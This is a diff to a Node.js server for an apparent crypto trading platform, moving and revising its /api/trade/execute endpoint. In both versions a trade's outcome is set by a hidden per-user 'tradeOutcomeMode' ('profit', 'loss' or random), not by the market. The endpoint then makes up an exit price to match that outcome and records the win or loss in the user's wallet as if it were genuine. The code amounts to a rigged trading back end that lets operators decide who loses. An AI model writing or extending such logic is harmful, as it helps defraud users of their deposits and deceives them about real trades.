@@ -769,6 +769,69 @@ const server = http.createServer(async (req, res) => {
       fs.writeFileSync(file, JSON.stringify(raw, null, 2));
       return sendJson(res, 200, { message: "Support message sent" });
     }
+
+    if (pathname === "/api/trade/execute" && req.method === "POST") {
+      const auth = req.headers.authorization || "";
+      const token = auth.startsWith("Bearer ") ? auth.slice(7) : "";
+      const decoded = verifyToken(token);
+      if (!decoded) return sendJson(res, 401, { message: "Unauthorized." });
+
+      const body = await parseBody(req);
+      const { amount, symbol, direction, duration, entryPrice } = body;
+      const amt = Number(amount);
+      if (!amt || amt <= 0) return sendJson(res, 400, { message: "Invalid amount" });
+
+      const wallet = readWalletForUser(decoded.id);
+      if ((wallet.balance || 0) < amt) return sendJson(res, 400, { message: "Insufficient balance" });
+
+      const user = getUserById(decoded.id);
+      const mode = user?.tradeOutcomeMode || "random";
+
+      let isWin = false;
+      if (mode === "profit") isWin = true;
+      else if (mode === "loss") isWin = false;
+      else isWin = Math.random() > 0.5;
+
+      const config = { "30": 30, "60": 40, "90": 50, "120": 60, "180": 70, "300": 80 };
+      const pct = config[String(duration)] || 30;
+      const profitAmount = (amt * pct) / 100;
+      
+      wallet.balance = (wallet.balance || 0) - amt;
+      if (isWin) {
+          wallet.balance += (amt + profitAmount);
+      }
+
+      const tradeId = `tr_${Date.now()}`;
+      const result = {
+          id: tradeId,
+          symbol,
+          direction,
+          duration,
+          amount: amt,
+          entryPrice: Number(entryPrice || 0),
+          exitPrice: isWin ? (Number(entryPrice || 0) * (1 + 0.001)) : (Number(entryPrice || 0) * (1 - 0.001)),
+          profitPct: isWin ? pct : -pct,
+          profitAmount: isWin ? profitAmount : -profitAmount,
+          isWin,
+          status: "completed",
+          created: Date.now()
+      };
+
+      wallet.transactions = wallet.transactions || [];
+      wallet.transactions.push({
+          id: tradeId,
+          created: Date.now(),
+          kind: "trade",
+          title: `Trade ${symbol}`,
+          amount: amt,
+          asset: "USDT",
+          status: "completed",
+          detail: `${direction.toUpperCase()} | ${isWin ? 'PROFIT' : 'LOSS'}: ${Math.abs(result.profitAmount).toFixed(2)} USDT`
+      });
+
+      writeWalletForUser(decoded.id, wallet);
+      return sendJson(res, 200, { message: "Success", result, wallet });
+    }
     if (req.method === "POST" && url.pathname === "/api/verification/submit") {
       const auth = req.headers.authorization || "";
       const token = auth.startsWith("Bearer ") ? auth.slice(7) : "";
@@ -1030,62 +1093,6 @@ const server = http.createServer(async (req, res) => {
       if (order.side === "buy") wallet.balance += order.amount;
       writeWalletForUser(decoded.id, wallet);
       return sendJson(res, 200, { message: "Order cancelled", wallet });
-    }
-
-    if (url.pathname === "/api/trade/execute" && req.method === "POST") {
-      const auth = req.headers.authorization || "";
-      const token = auth.startsWith("Bearer ") ? auth.slice(7) : "";
-      const decoded = verifyToken(token);
-      if (!decoded) return sendJson(res, 401, { message: "Unauthorized." });
-
-      const { amount, symbol, direction, duration, entryPrice } = await parseBody(req);
-      const amt = Number(amount);
-      if (!amt || amt <= 0) return sendJson(res, 400, { message: "Invalid amount" });
-
-      const wallet = readWalletForUser(decoded.id);
-      if (wallet.balance < amt) return sendJson(res, 400, { message: "Insufficient balance" });
-
-      const users = readUsers();
-      const user = users.find(u => u.id === decoded.id);
-      const mode = user?.tradeOutcomeMode || "random";
-
-      let isWin = false;
-      if (mode === "profit") isWin = true;
-      else if (mode === "loss") isWin = false;
-      else isWin = Math.random() > 0.5;
-
-      const config = { "30": 30, "60": 40, "90": 50, "120": 60, "180": 70, "300": 80 };
-      const pct = config[String(duration)] || 30;
-      const profitAmount = (amt * pct) / 100;
-      
-      wallet.balance -= amt;
-      if (isWin) wallet.balance += (amt + profitAmount);
-
-      const tradeId = `tr_${Date.now()}`;
-      const result = {
-        id: tradeId,
-        symbol,
-        direction,
-        duration,
-        amount: amt,
-        entryPrice,
-        exitPrice: isWin ? entryPrice * (1 + (pct/1000)) : entryPrice * (1 - (pct/1000)),
-        profitPct: isWin ? pct : -pct,
-        profitAmount: isWin ? profitAmount : -profitAmount,
-        isWin,
-        status: "completed",
-        created: Date.now()
-      };
-
-      wallet.transactions = wallet.transactions || [];
-      wallet.transactions.push({
-        ...result,
-        type: "trade",
-        description: `Trade ${symbol} (${duration}s) - ${isWin ? 'PROFIT' : 'LOSS'}`
-      });
-
-      writeWalletForUser(decoded.id, wallet);
-      return sendJson(res, 200, { message: "Success", result, wallet });
     }
 
     return serveFile(url.pathname, res);
